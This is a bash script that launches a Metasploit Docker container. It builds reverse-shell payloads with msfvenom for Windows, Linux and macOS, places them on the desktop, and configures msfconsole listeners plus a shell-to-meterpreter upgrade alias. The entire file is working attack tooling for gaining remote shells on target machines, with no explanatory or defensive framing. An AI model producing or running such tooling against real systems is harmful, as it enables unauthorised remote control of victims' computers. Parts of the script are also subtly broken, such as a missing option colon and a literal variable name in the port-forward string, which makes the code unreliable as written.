#!/bin/bash

function print_help { echo "docker_start.sh -d <Folder for console desktop> -n <network iface> -p <exploit port> -w [Windows Payload] -l [Linux Payoad]" -o [OSX Payload] >&2 ; } 

		
while getopts d:n:p:uwlo option
do
	case "${option}" in
		d)
			desktopfolder=${OPTARG}
			;;
		n) 
			netiface=${OPTARG}
			hostip="$(ipconfig getifaddr $netiface)"
			;;
		p)
			exploitport=$OPTARG
			if [ -z $forwardports ]; then
				forwardports=$(echo '-p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
			else
				forwardports=$(echo forwardports)$(echo ' -p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
			fi
			;;
		u)
			shellupgradeport=$OPTARG
			;;
		w)
			winpay=1
			;;
		l)
			linpay=1
			;;
		o)
			osxpay=1
			;;
		?) print_help; exit 2;;
	esac
done

if [ -z $desktopfolder ]; then
	desktopfolder=~/Desktop
fi

if [ -z $shellupgradeport ]; then
	shellupgradeport=4433
fi

mkdir /tmp/msf

# start bash ports forwarding and shared folders
msf="$(docker run -d -t \
	$forwardports -p $shellupgradeport:$shellupgradeport \
	-v $desktopfolder:/pentest/Desktop \
	-v /tmp/msf:/pentest/tmp \
	pennoser/msf:latest /bin/bash)"

# build basic reverse payloads for host
if [ -n "$winpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "windows/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "exe" \
		-o "/pentest/tmp/shell.exe"
	ln -s /tmp/msf/shell.exe $desktopfolder/shell.exe
fi
if [ -n "$linpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "linux/x86/meterpreter/reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" \
		-f "elf" \
		-o "/pentest/tmp/shell"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/tmp/shell"
	ln -s /tmp/msf/shell $desktopfolder/shell

fi
if [ -n "$osxpay" ]; then
	docker exec -ti $msf msfvenom \
		-p "osx/x86/shell_reverse_tcp" \
		"LHOST=$hostip" \
		"LPORT=$exploitport" -f \
		"macho" -o "/pentest/tmp/shell.command"
	docker exec -ti $msf /bin/bash \
		-c "chmod +x /pentest/tmp/shell.command"
	ln -s /tmp/msf/shell.command $desktopfolder/shell.command
fi

# setup msfconsole startup
docker exec -t $msf /bin/bash \
	-c "echo alias upgrade 'use post/multi/manage/shell_to_meterpreter LPORT=$shellupgradeport' >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/linpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/winpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo set lport $exploitport >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo exploit -j >> /root/.msf4/osxpay.rc"
docker exec -t $msf /bin/bash \
	-c "echo clear >> /root/.msf4/msfconsole.rc"
docker exec -t $msf /bin/bash \
	-c "echo set -g LHOST $hostip >> /root/.msf4/msfconsole.rc"

# run msfconsole
docker exec -ti $msf msf 

# cleanup
docker container stop $msf
docker container rm $msf
rm -rf /tmp/msf
desktopfolder=''
netiface=''
hostip=''
exploitport=''
shellupgradeport=''
winpay=''
linpay=''
osxpay=''
